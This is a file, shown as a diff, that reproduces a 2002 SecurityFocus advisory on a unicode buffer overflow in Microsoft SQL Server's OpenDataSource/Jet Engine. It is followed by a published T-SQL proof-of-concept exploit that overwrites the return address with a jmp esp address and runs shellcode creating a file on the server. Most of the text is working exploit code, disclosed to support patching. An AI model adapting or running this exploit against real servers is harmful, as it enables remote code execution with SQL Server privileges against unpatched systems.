@@ -1,0 +1,68 @@
+source: http://www.securityfocus.com/bid/5057/info
+
+Microsoft SQL Server is prone to a remotely exploitable unicode-based buffer overflow condition. This condition occurs when the OpenDataSource function is used with MS Jet Engine.
+
+This issue may be exploited to execute attacker-supplied instructions with the privileges of the SQL Server process. This issue requires that the attacker can pass malicious data to the OpenDataSource function and may be exploitable remotely via SQL injection vulnerabilities in web-based software.
+
+Due to this being an issue in the MS Jet Engine component itself, other products which rely on Jet Engine may also be affected by this vulnerability.
+
+We previously alerted on this issue in BID 4847 "Microsoft SQL Server 2000 Multiple Vulnerabilities". This issue was originally publicized as a VNA by NGSSoftware. 
+
+-------8<---------
+
+-- Simple Proof of Concept
+-- Exploits a buffer overrun in OpenDataSource()
+--
+-- Demonstrates how to exploit a UNICODE overflow using T-SQL
+-- Calls CreateFile() creating a file called c:\SQL-ODSJET-BO
+-- I'm overwriting the saved return address with 0x42B0C9DC
+-- This is in sqlsort.dll and is consistent between SQL 2000 SP1 and SP2
+-- The address holds a jmp esp instruction.
+--
+-- To protect against this overflow download the latest Jet Service
+-- pack from Microsoft - http://www.microsoft.com/
+--
+-- David Litchfield (david@ngssoftware.com)
+-- 19th June 2002
+
+
+
+declare @exploit nvarchar(4000)
+declare @padding nvarchar(2000)
+declare @saved_return_address nvarchar(20)
+declare @code nvarchar(1000)
+declare @pad nvarchar(16)
+declare @cnt int
+declare @more_pad nvarchar(100)
+
+select @cnt = 0
+select @padding = 0x41414141
+select @pad = 0x4141
+
+while @cnt < 1063
+begin
+select @padding = @padding + @pad
+select @cnt = @cnt + 1
+end
+
+-- overwrite the saved return address
+
+select @saved_return_address = 0xDCC9B042
+select @more_pad = 0x4343434344444444454545454646464647474747
+
+-- code to call CreateFile(). The address is hardcoded to 0x77E86F87 - Win2K
+Sp2
+-- change if running a different service pack
+
+select @code =
+0x558BEC33C05068542D424F6844534A4568514C2D4F68433A5C538D142450504050485050B0
+C05052B8876FE877FFD0CCCCCCCCCC
+select @exploit = N'SELECT * FROM
+penDataSource( ''Microsoft.Jet.OLEDB.4.0'',''Data Source="c:\'
+select @exploit = @exploit + @padding + @saved_return_address + @more_pad +
+@code
+select @exploit = @exploit + N'";User ID=Admin;Password=;Extended
+properties=Excel 5.0'')...xactions'
+exec (@exploit)
+
+------->8--------- 
